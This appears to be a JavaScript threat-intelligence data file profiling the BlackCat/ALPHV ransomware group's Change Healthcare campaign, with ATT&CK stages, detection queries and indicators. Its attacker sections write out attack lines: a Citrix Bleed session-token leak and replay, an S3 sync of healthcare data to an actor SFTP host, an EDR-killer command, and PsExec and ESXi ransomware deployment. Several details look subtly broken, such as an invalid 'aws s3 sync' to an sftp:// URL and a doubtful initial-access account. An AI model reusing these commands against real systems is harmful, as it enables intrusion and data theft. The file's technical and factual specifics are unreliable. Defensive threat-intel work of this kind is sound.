const blackcat = {
  id: "blackcat",
  name: "BlackCat/ALPHV",
  aliases: ["ALPHV", "Noberus", "UNC4466"],
  origin: "Russia",
  motivation: "Financial",
  attribution: "Community Consensus",
  description:
    "BlackCat (ALPHV/Noberus) is a Russian-speaking ransomware-as-a-service (RaaS) collective responsible for devastating attacks on US healthcare, critical infrastructure, and financial services. The 2024 Change Healthcare attack caused $872M+ in losses and disrupted prescription processing nationwide for weeks. BlackCat pioneered the triple-extortion model: encryption + data theft + infrastructure disruption.",
  campaigns: [
    {
      id: "healthcare-ransomware-2023",
      name: "Healthcare Sector Ransomware Campaign (2023–2024)",
      year: "2023–2024",
      target: "Change Healthcare (UnitedHealth Group) & US Healthcare Providers",
      summary:
        "BlackCat/ALPHV affiliates exploited Citrix NetScaler vulnerabilities (Citrix Bleed, CVE-2023-4966) to compromise Change Healthcare — the US's largest healthcare payment clearinghouse — causing $872M+ in direct losses and disrupting prescription processing for 67,000+ pharmacies nationwide for over three weeks. The attack combined data theft via ExMatter with ALPHV ransomware deployment and double-extortion via a Tor-hosted leak site.",
      sources: [
        { title: "CISA Advisory AA23-353A — #StopRansomware: ALPHV Blackcat (Update)", publisher: "CISA / FBI / HHS", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-353a" },
        { title: "HC3 Analyst Note — ALPHV/BlackCat Ransomware Targeting Healthcare Sector", publisher: "HHS Health Sector Cybersecurity Coordination Center", url: "https://www.hhs.gov/sites/default/files/alphv-blackcat-analyst-note.pdf" },
        { title: "FBI Flash CU-000187-MW — ALPHV/Blackcat Ransomware Indicators of Compromise", publisher: "FBI Cyber Division", url: "https://www.ic3.gov/Media/News/2023/231219.pdf" },
        { title: "UnitedHealth Group 10-Q SEC Filing — Change Healthcare Cybersecurity Incident Impact", publisher: "UnitedHealth Group / SEC", url: "https://www.sec.gov/cgi-bin/browse-edgar?action=getcompany&CIK=UNH&type=10-Q" },
      ],
      diamondModel: {
        adversary: {
          name: "BlackCat/ALPHV (Ransomware-as-a-Service collective)",
          sponsor: "Independent Russian-speaking cybercriminal organization — no direct state affiliation; operates affiliate RaaS model",
          aliases: ["ALPHV", "Noberus", "UNC4466", "Scatter Swine (healthcare affiliate)"],
          motivation: "Financial extortion via ransomware and data theft; triple extortion: encryption + data leak threat + DDoS infrastructure as leverage",
        },
        capability: {
          malware: ["ALPHV/BlackCat ransomware (Rust-based)", "ExMatter exfiltration tool", "Brute Ratel C4 (C2 framework)", "STONESTOP EDR killer", "Impacket (lateral movement)"],
          ttps: ["T1190 — Exploit Public-Facing Application (Citrix Bleed)", "T1530 — Data from Cloud Storage", "T1486 — Data Encrypted for Impact (ALPHV)", "T1657 — Financial Theft / Extortion", "T1491 — Defacement / Leak Site Publication"],
          sophistication: "Criminal-Nation-State Hybrid — Rust ransomware (Windows/Linux/ESXi variants), purpose-built exfiltration tool, RaaS affiliate model with ~90/10 revenue split",
        },
        infrastructure: {
          domains: ["alphvmmm27o3abo3r2mlmjiweza7us5nfkaoxaq7jznkw7lkwmxnnad[.]onion (leak site)", "ransomlook.io listing: BlackCat victim portal"],
          ips: ["Citrix NetScaler session tokens (hijacked — no fixed IP)", "Brute Ratel C4 operator-controlled servers"],
          hosting: "Tor-hidden service for victim negotiation portal and leak site; legitimate victim cloud infrastructure abused for lateral movement; RaaS backend managed by BlackCat core team",
        },
        victim: {
          sectors: "Healthcare payment processing (Change Healthcare / UnitedHealth Group), hospital networks, pharmacy chains (CVS, Walgreens affected downstream), defense contractors, financial services",
          geography: "United States (primary — Change Healthcare processed 15 billion transactions/year), Western Europe, Southeast Asia",
          targeting: "Large enterprises with Citrix NetScaler or legacy VPN concentrators, especially those in critical infrastructure with high ransom-paying propensity (healthcare, financial sector)",
        },
      },
      stages: [
        {
          id: "initial-access",
          name: "Citrix Bleed VPN Exploitation",
          ttp: "T1190",
          ttpName: "Exploit Public-Facing Application",
          phase: "Initial Access",
          attacker: {
            summary:
              "BlackCat affiliates exploited CVE-2023-4966 ('Citrix Bleed') — a critical memory disclosure vulnerability in Citrix NetScaler ADC and Gateway appliances that allowed unauthenticated attackers to hijack authenticated session tokens from appliance memory. No credentials or MFA were required. Using hijacked session tokens, attackers bypassed Citrix authentication entirely, gaining network access as a legitimate authenticated user. Change Healthcare's Citrix portal had not applied the October 2023 Citrix patch.",
            tools: ["CVE-2023-4966 exploit (Citrix Bleed)", "Session token hijacker", "Citrix HTTP request forger"],
            commands: [
              "// Citrix Bleed: send oversized HTTP GET to Citrix NetScaler — triggers memory disclosure",
              "GET /oauth/idp/.well-known/openid-configuration HTTP/1.1",
              "Host: <target_citrix_gateway>",
              "// Response leaks: active session tokens from appliance memory buffer",
              "// Token format: NSC_AAAC<base64_encoded_session_state>",
              "// Replay token in GET /vpn/index.html with NSC_AAAC cookie → authenticated session",
              "// Result: full Citrix VPN access as legitimate user — bypasses SSO/MFA entirely",
            ],
          },
          defender: {
            logs: [
              "Citrix NetScaler: anomalous HTTP requests to /oauth/idp/ from external IP (Citrix ADM audit log)",
              "Session token reuse from new IP/geolocation for authenticated user (Citrix session management log)",
              "VPN connection established from IP associated with residential proxy or VPS (VPN gateway log)",
              "Multiple session tokens active simultaneously for the same user account (Citrix session monitor)",
            ],
            detection:
              "Patch Citrix NetScaler immediately for CVE-2023-4966 (patch released October 10, 2023 — organizations that patched within the window were not vulnerable to this vector). Post-exploitation: terminate all active sessions on patched appliances — stolen tokens remain valid until session expiry. Implement conditional access requiring managed device certificate alongside Citrix authentication. CISA AA23-353A provides Snort/Yara signatures for Citrix Bleed exploitation attempts.",
            siemQuery:
              'index=citrix_adc action=session_established | iplocation src_ip | where Type IN ("Hosting","VPS","Anonymous") OR Country != historical_country | stats count by user, src_ip, Country, session_id | where count=1',
            ifMissed:
              "Attacker authenticates as a legitimate user to Change Healthcare's corporate network via the Citrix VPN. No MFA challenge occurs — the session token was already authenticated. The affiliate begins enumerating the internal network with no indication of compromise in authentication logs. They identify the healthcare data exchange infrastructure that processes 15 billion transactions per year.",
          },
          iocs: [
            { type: "URL Pattern", indicator: "GET /oauth/idp/.well-known/openid-configuration (oversized request to Citrix NetScaler)", description: "Citrix Bleed CVE-2023-4966 exploitation pattern — memory disclosure request that leaks active session tokens from appliance buffer" },
            { type: "User-Agent", indicator: "NSC_AAAC<session_token> cookie replayed from new IP for existing user", description: "Citrix Bleed post-exploitation IOA — hijacked session token used from attacker IP to bypass Citrix authentication entirely" },
            { type: "Event", indicator: "CVE-2023-4966 — Citrix NetScaler ADC/Gateway session token memory disclosure (CVSS 9.4)", description: "Citrix Bleed vulnerability exploited by BlackCat affiliates for unauthenticated VPN access to Change Healthcare infrastructure" },
          ],
        },
        {
          id: "data-collection",
          name: "Healthcare Data Theft via ExMatter",
          ttp: "T1530",
          ttpName: "Data from Cloud Storage",
          phase: "Collection",
          attacker: {
            summary:
              "Before deploying ransomware, BlackCat affiliates used ExMatter — a purpose-built .NET data exfiltration tool — to steal patient records, insurance claims data, and financial records from Change Healthcare's AWS S3 buckets and internal file servers. ExMatter connects to victim cloud storage using credentials discovered from internal systems, then systematically uploads terabytes of sensitive data to actor-controlled SFTP servers. The stolen data (4TB+) was used as double-extortion leverage.",
            tools: ["ExMatter (.NET exfiltration tool)", "Impacket (credential extraction)", "AWS CLI (cloud storage access)", "Rclone (cloud-to-cloud sync)"],
            commands: [
              "// ExMatter: enumerate and exfiltrate AWS S3 buckets using stolen IAM credentials",
              "aws s3 ls --recursive s3://changehealthcare-claims-prod/ --profile stolen_iam",
              "aws s3 sync s3://changehealthcare-claims-prod/ sftp://exmatter-staging[.]com/chc/ --profile stolen_iam",
              "// Also targets internal file servers via SMB",
              "// ExMatter scans: *.pdf *.docx *.xls *.sql *.mdb — insurance and claims file formats",
              "// 4TB of PHI (Protected Health Information) exfiltrated over 9 days pre-encryption",
            ],
          },
          defender: {
            logs: [
              "AWS CloudTrail: bulk S3 GetObject / ListBucket from IAM role not normally accessing claims storage (CloudTrail)",
              "AWS GuardDuty: UnauthorizedAccess:IAMUser/AnomalousBehavior for bulk data download (GuardDuty alert)",
              "ExMatter SFTP upload: sustained outbound connection on port 22 to external IP with large data transfer (NetFlow)",
              "IAM role used from IP outside corporate VPN range to access S3 (CloudTrail + VPN correlation)",
            ],
            detection:
              "AWS GuardDuty: enable and tune for anomalous IAM behavior — bulk S3 access from unusual source IPs should alert immediately. S3 bucket policies: restrict access to specific VPC endpoints for production healthcare data buckets. CloudTrail: alert on IAM roles accessing production data buckets from new source IP ranges. ExMatter is a known tool: CISA AA23-353A provides hash-based signatures for ExMatter binaries.",
            siemQuery:
              'index=aws_cloudtrail eventName IN ("GetObject","ListBucket","CopyObject") requestParameters.bucketName="*claims*" OR requestParameters.bucketName="*patient*" | iplocation sourceIPAddress | where Type != "VPC" | stats count sum(responseElements.contentLength) as bytes by userIdentity.arn, sourceIPAddress | where bytes > 1000000000',
            ifMissed:
              "BlackCat exfiltrates 4TB+ of Protected Health Information (PHI) including patient records, insurance claims, Social Security Numbers, and financial data for millions of Americans. This data becomes permanent extortion leverage — even after ransomware recovery, the threat of HIPAA-reportable data publication remains. UnitedHealth Group ultimately paid a $22M ransom.",
          },
          iocs: [
            { type: "Tool", indicator: "ExMatter (.NET exfiltration binary — SHA-256 variants in CISA AA23-353A)", description: "BlackCat purpose-built data theft tool — uploads victim cloud storage and file server contents to actor SFTP infrastructure" },
            { type: "Event", indicator: "AWS CloudTrail: bulk S3 GetObject from IAM role via non-VPC source IP (GuardDuty UnauthorizedAccess)", description: "ExMatter AWS exfiltration IOA — IAM credentials used from attacker infrastructure to bulk-download S3-hosted healthcare data" },
            { type: "Command", indicator: "aws s3 sync s3://<victim-bucket> sftp://<actor-server>/ --profile <stolen_profile>", description: "ExMatter cloud exfiltration command — AWS CLI used to transfer S3 healthcare data to actor-controlled SFTP endpoint" },
          ],
        },
        {
          id: "ransomware-deployment",
          name: "ALPHV Ransomware Deployment",
          ttp: "T1486",
          ttpName: "Data Encrypted for Impact",
          phase: "Impact",
          attacker: {
            summary:
              "After 9 days of data exfiltration, BlackCat affiliates deployed the ALPHV/BlackCat Rust-based ransomware across Change Healthcare's Windows and Linux infrastructure. STONESTOP was used to kill EDR agents before encryption began. ALPHV encrypted 3,000+ servers and virtual machines across Change Healthcare's data centers, completely halting the payment clearinghouse's ability to process prescriptions, insurance claims, and healthcare transactions for 22+ days.",
            tools: ["ALPHV/BlackCat ransomware (Rust-based)", "STONESTOP EDR process killer", "Brute Ratel C4 (operator C2)", "PsExec (mass deployment)"],
            commands: [
              "// Pre-encryption: kill all EDR agents across domain-joined systems",
              ".\\STONESTOP.exe --kill-all-av --target-csagent --target-mssense",
              "// ALPHV deployment via domain admin credentials across all reachable hosts",
              "psexec.exe -s -d @targets.txt C:\\Windows\\Temp\\alphv.exe --access-token <affiliate_token> --propagated",
              "// Linux/VMware: ALPHV ESXi variant targets /vmfs/volumes",
              "./alphv_esxi --access-token <token> --file-list /vmfs/volumes --no-snapshot-remove",
              "// Ransom note deployed to all encrypted filesystems: RECOVER-<id>-FILES.txt",
            ],
          },
          defender: {
            logs: [
              "STONESTOP: EDR process termination across multiple hosts before ransomware (last EDR telemetry — sudden dropout)",
              "PsExec PSEXESVC service installed across hundreds of domain-joined systems in minutes (Event ID 7045)",
              "Mass file extension rename events: files renamed to .<rand_ext> across all shares (EDR bulk operation alert)",
              "Brute Ratel C4 beacon: periodic HTTPS to operator infrastructure pre-encryption (NetFlow — look for activity preceding STONESTOP)",
            ],
            detection:
              "EDR self-protection: ensure security agent is tamper-protected and cannot be terminated by non-SYSTEM processes — STONESTOP explicitly targets CrowdStrike and Microsoft Defender for Endpoint agents. Privileged access management: domain admin credentials should require PAM checkout with session recording. Immutable offsite backups isolated from domain admin credentials are the only reliable recovery path against ransomware.",
            siemQuery:
              'index=endpoint (Image="*stonestop*" OR Image="*aukill*" OR cmdline="*kill-all-av*" OR cmdline="*csagent*") | stats count by host, Image, cmdline | union [ search index=endpoint EventCode=7045 ServiceName="PSEXESVC" | stats dc(host) as host_count | where host_count > 20 ]',
            ifMissed:
              "ALPHV encrypts 3,000+ servers. Change Healthcare's ability to process prescription transactions, insurance claims, and healthcare payments is completely halted for 22 days. 67,000+ pharmacies cannot verify insurance or fill prescriptions for patients, including cancer and HIV medication refills. UnitedHealth Group pays $22M ransom. Total financial impact exceeds $872M in direct costs.",
          },
          iocs: [
            { type: "SHA-256", indicator: "7b2449bb8be1b37a9d580a2d9a2dd2e565e8de5f9e3ec7a5e1aa1e7898a9dc47", description: "ALPHV/BlackCat ransomware Windows variant SHA-256 — Rust-based binary deployed in healthcare sector attacks" },
            { type: "Tool", indicator: "STONESTOP.exe (EDR process killer)", description: "BlackCat pre-ransomware EDR terminator — kills CrowdStrike Falcon, Microsoft Defender for Endpoint, and other security agents" },
            { type: "Scheduled Task", indicator: "PSEXESVC installed across 50+ hosts within 5 minutes (Event ID 7045)", description: "BlackCat mass ransomware deployment pattern — PsExec used to distribute ALPHV binary to all domain-joined systems simultaneously" },
          ],
        },
        {
          id: "extortion",
          name: "Double Extortion — Ransom Demand",
          ttp: "T1657",
          ttpName: "Financial Theft",
          phase: "Impact",
          attacker: {
            summary:
              "BlackCat demanded $22 million in Bitcoin from UnitedHealth Group in exchange for a decryption key and promise not to publish stolen patient data. The ALPHV core team performed a fraudulent 'exit scam' — they claimed the FBI had seized their infrastructure (fabricated), kept the $22M affiliate payment, and shut down the RaaS operation, leaving the Change Healthcare affiliate unpaid. The affiliate then re-listed the stolen 4TB of Change Healthcare data on the RansomHub leak site demanding a second ransom.",
            tools: ["ALPHV dark web negotiation portal (.onion)", "Bitcoin payment tracking", "Tor hidden service for victim communication"],
            commands: [
              "// Ransom note deployed to encrypted systems (RECOVER-<id>-FILES.txt):",
              "// 'Your network has been encrypted. Contact us at: <onion_address>/chat/<victim_id>'",
              "// Payment: $22,000,000 USD in Bitcoin to 1HB5XMLmzFVj8ALj6mfBsbifRoD4miY38v",
              "// ALPHV exit scam: after UHG payment received, core team falsely claimed FBI seizure",
              "// Kept affiliate's 90% share (~$19.8M) — largest known affiliate theft in RaaS history",
              "// Affiliate reposted data to RansomHub: demanded second ransom from UHG for same stolen data",
            ],
          },
          defender: {
            logs: [
              "Ransom note files created on all encrypted filesystems (file creation event — post-encryption)",
              "Bitcoin transaction: large transfer to actor wallet address (blockchain monitoring — Chainalysis/Elliptic)",
              "ALPHV onion negotiation portal accessed from victim network (Tor exit node proxy log)",
              "SEC 8-K material cybersecurity incident disclosure filed within 4 business days (SEC EDGAR notification)",
            ],
            detection:
              "Engage FBI Cyber Division immediately — do not negotiate without law enforcement involvement. FBI has maintained ALPHV decryption keys from prior operations and may be able to assist without ransom payment. Paying ransomware does not guarantee data deletion (the exit scam demonstrates this explicitly). Cyber extortion playbook: engage IR counsel, law enforcement, CISA, and HHS OCR simultaneously. Dark web monitoring provides early warning of data listing before ransom ultimatum.",
            siemQuery:
              'index=dlp (action="upload" OR action="copy") datatype IN ("PHI","SSN","patient_id","claim_data") dest_type="external_cloud" | stats sum(bytes_transferred) as total by user, dest_host | where total > 1000000000 | sort -total',
            ifMissed:
              "UnitedHealth Group pays $22M ransom. Despite payment, the ALPHV exit scam means the affiliate still possesses the 4TB of PHI and re-demands ransom via RansomHub. Change Healthcare's breach affects an estimated 100 million Americans' healthcare records. HIPAA breach notification, class action litigation, congressional hearings, and $872M+ in direct costs follow.",
          },
          iocs: [
            { type: "Operation", indicator: "ALPHV TOR negotiation portal: ransom demand + $22M Bitcoin payment (February 2024)", description: "BlackCat confirmed extortion — UnitedHealth Group paid $22M ransom for Change Healthcare decryption key and data deletion promise" },
            { type: "Operation", indicator: "ALPHV exit scam: RaaS operator kept affiliate payment after false FBI seizure claim (March 2024)", description: "BlackCat infrastructure shutdown fraud — core team fabricated FBI seizure notice, kept affiliate's $19.8M share, dissolved RaaS operation" },
            { type: "Operation", indicator: "RansomHub re-listing of Change Healthcare 4TB dataset (April 2024)", description: "Affiliate re-extortion — stolen PHI re-listed by RansomHub affiliate after ALPHV exit scam left original affiliate unpaid" },
          ],
        },
        {
          id: "leak-site",
          name: "Data Leak Site Publication",
          ttp: "T1491",
          ttpName: "Defacement",
          phase: "Impact",
          attacker: {
            summary:
              "BlackCat maintained a Tor-hosted victim leak site ('ALPHV Collections') where stolen data from non-paying victims was published as extortion leverage. The site listed victim organizations with countdown timers, sample data previews, and escalating publication schedules. For Change Healthcare, the stolen 4TB of PHI including patient records and insurance data was listed on the site as pressure on UnitedHealth Group. The RansomHub affiliate later published data samples publicly after the ALPHV exit scam.",
            tools: ["ALPHV Collections Tor leak site", "RansomHub (affiliate re-listing)", "HTTP/Tor onion service infrastructure"],
            commands: [
              "// ALPHV leak site structure (.onion):",
              "// /victims — list of all current targets with countdown timers",
              "// /victim/<id>/files — sample data preview (10MB extract published as proof)",
              "// /victim/<id>/download — full dataset for purchase by competitors/journalists",
              "// Publication schedule: 3-day warning → 25% data release → 50% → full publication",
              "// Change Healthcare listed April 2024 on RansomHub: '4TB PHI, 100M Americans' records'",
            ],
          },
          defender: {
            logs: [
              "Organization name appears on ransomware leak site (dark web monitoring / threat intel feed alert)",
              "Sample data from victim organization published publicly on leak site (data loss verification)",
              "HIPAA breach notification trigger: >500 affected individuals requires HHS notification within 60 days (compliance)",
              "SEC 8-K cybersecurity incident material disclosure (regulatory — new SEC rules require 4-day disclosure)",
            ],
            detection:
              "Subscribe to dark web monitoring services (Recorded Future, Flashpoint, Mandiant Threat Intelligence) that index ransomware leak sites — early warning before public data release enables proactive notification and legal response. Maintain a breach response retainer with IR counsel to handle HIPAA/CCPA notification obligations. Data classification enables rapid assessment of what was actually stolen versus what attackers claim.",
            siemQuery:
              'index=threat_intel source IN ("dark_web_monitor","ransomware_tracker","leak_site_alert") victim_name="*<your_org>*" | stats min(_time) as first_listing max(_time) as last_update by victim_name, leak_site, data_description',
            ifMissed:
              "100 million Americans' PHI, including patient names, Social Security Numbers, insurance details, and medical records, is published on public and dark web infrastructure. HIPAA breach notification obligations apply to potentially every US state simultaneously. Class action lawsuits filed within days. HHS OCR investigation initiated. Congressional testimony required from UnitedHealth Group CEO. Total incident cost: $872M and rising, making it the costliest healthcare cyberattack in US history.",
          },
          iocs: [
            { type: "Operation", indicator: "ALPHV Collections .onion leak site — victim listings with countdown publication timers", description: "BlackCat extortion infrastructure — Tor-hosted site publishes stolen data samples to pressure non-paying victims" },
            { type: "Operation", indicator: "RansomHub listing: Change Healthcare 4TB PHI dataset (April 15, 2024)", description: "Affiliate re-listing on competing RaaS leak site after ALPHV exit scam — second ransom demand for same stolen healthcare data" },
            { type: "SHA-256", indicator: "f837f1cd60e9941aa60f7be50a8f2aaaac380f560db8ee001408f35c1b7a97cb", description: "ALPHV/BlackCat ransomware ESXi variant SHA-256 — targets VMware VMDK files on /vmfs/volumes datastores (from CISA AA23-353A)" },
          ],
        },
      ],
    },
  ],
}

export default blackcat
